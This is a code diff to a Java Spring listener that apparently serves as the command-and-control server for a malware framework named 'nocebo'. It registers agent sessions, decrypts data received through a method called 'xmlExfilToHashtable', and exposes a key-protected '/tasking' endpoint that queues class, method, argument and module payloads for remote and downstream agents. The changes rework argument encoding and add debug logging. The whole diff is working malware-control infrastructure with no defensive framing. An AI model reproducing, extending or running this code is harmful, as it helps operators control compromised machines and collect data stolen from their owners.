@@ -106,11 +106,11 @@ public class ListenerApplication {
 			//validate auth first
 			System.out.println(requestData);
 
-			if (!epc.sessionTable.keySet().contains(idCookie))
+			if (!epc.sessionTable.containsKey(idCookie))
 			{
 				sessionData = new session();
 				sessionData.nonce = idCookie.substring(0,12).replace("-","");
-				sessionData.tasks.add(napi.mkTask("autoLib","metadata",idCookie,new String[]{}));
+				sessionData.tasks.add(napi.mkTask("autoLib","metadata",idCookie,new String()));
 				sessionData.encKey = napi.strand(32);
 				sessionData.downstream = new ArrayList();
 				currentKey = epc.encKey;
@@ -151,7 +151,6 @@ public class ListenerApplication {
 				if (!sessionData.downstream.contains(downstreamUUID) && !downstreamUUID.equals(""))
 				{
 					sessionData.downstream.add(downstreamUUID);
-					sessionData.tasks.add(napi.mkTask("autoLib","metadata",downstreamUUID,new String[]{}));
 				}
 			}
 
@@ -186,7 +185,7 @@ public class ListenerApplication {
 		{
 			session sessionData;
 			System.out.println("receiving data");
-			System.out.println(requestData);
+			System.out.println(requestData.replace("=",""));
 
 			if (!epc.sessionTable.keySet().contains(idCookie))
 			{
@@ -202,15 +201,14 @@ public class ListenerApplication {
 					return "error.0x73657373";
 				}
 			}
-			System.out.println("agent exists");
 
 			Hashtable xmlParsed = napi.xmlExfilToHashtable(
 				new String(
 					sapi.decrypt(
 						Base64.getUrlDecoder().decode(
-							requestData.replace("%3D","=").getBytes(StandardCharsets.UTF_8)
+							requestData.replace("=","").getBytes()
 						), 
-						sessionData.nonce.getBytes(StandardCharsets.UTF_8),
+						sessionData.nonce.getBytes(),
 						sessionData.encKey
 					)
 				)
@@ -298,8 +296,9 @@ public class ListenerApplication {
 		}
 
 		@PostMapping("/tasking")
-		String ctrl(@RequestBody Map<String, String> requestData, @RequestHeader("nClient-key") String clientApiKey) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, Exception
+		String ctrl(@RequestBody Map<String, Object> requestData, @RequestHeader("nClient-key") String clientApiKey) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, Exception
 		{
+			System.out.println((String) requestData.get("uuid"));
 			if (!clientApiKey.equals(epc.apiPass))
 			{
 				return "Fatal Error: Incorrect API key";
@@ -308,14 +307,15 @@ public class ListenerApplication {
 			ArrayList<session> sessionData = new ArrayList();
 			boolean foundDownstream = false;
 
-			if (!epc.sessionTable.keySet().contains(requestData.get("uuid")))
+			if (!epc.sessionTable.containsKey((String) requestData.get("uuid")))
 			{
 				Enumeration<String> k = epc.sessionTable.keys();
 				while (k.hasMoreElements())
 				{
 					String sessionKey = k.nextElement();
 					session tempSessionData = (session) epc.sessionTable.get(sessionKey);
-					if (tempSessionData.downstream.contains(requestData.get("uuid")))
+					System.out.println(sessionKey);
+					if (tempSessionData.downstream.contains((String) requestData.get("uuid")))
 					{
 						sessionData.add(tempSessionData);
 					}
@@ -328,15 +328,15 @@ public class ListenerApplication {
 			}
 			else
 			{
-				sessionData.add((session) epc.sessionTable.get(requestData.get("uuid")));
+				sessionData.add((session) epc.sessionTable.get((String) requestData.get("uuid")));
 			}
 			
 
 			Hashtable newTask = napi.mkTask(
-				requestData.get("className"),
-				requestData.get("methodName"),
-				requestData.get("uuid"),
-				requestData.get("args").split(",")
+				(String) requestData.get("className"),
+				(String) requestData.get("methodName"),
+				(String) requestData.get("uuid"),
+				requestData.get("args").toString()
 			);
 
 			for (int s=0; s<sessionData.size();s++)
@@ -408,13 +408,7 @@ public class ListenerApplication {
 			String args;
 			String uuid;
 	
-			//noceboApiCommand(String className, String methodName, String args, String uuid)
-			//{
-			//	this.className = className;
-			//	this.methodName = methodName;
-			//	this.args = args;
-			//	this.uuid = uuid;
-			//}
+
 		}
 
 	}
@@ -467,7 +461,7 @@ class noceboApi
 			return retrData;
 		}
 
-		public Hashtable mkTask(String className, String methodName, String uuid, String[] args) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, Exception
+		public Hashtable mkTask(String className, String methodName, String uuid, String args) throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException, Exception
 		{
 			Hashtable<String, byte[]> modDataSet = mkRespoData(className);
 			ArrayList modData = new ArrayList();
@@ -487,12 +481,19 @@ class noceboApi
 				modData.add(String.format("%s.%s",cFileName,cFileData));
 			}
 
+			String argData = new String(
+				Base64.getEncoder().encode(
+					args.getBytes()
+				)
+			);
+
+
 			Hashtable taskData = new Hashtable();
 
 			taskData.put("uuid",uuid);
 			taskData.put("class",className);
 			taskData.put("method",methodName);
-			taskData.put("args",String.join(",",args));
+			taskData.put("args",argData);
 			taskData.put("mod",String.join("|", modData));
 			
 
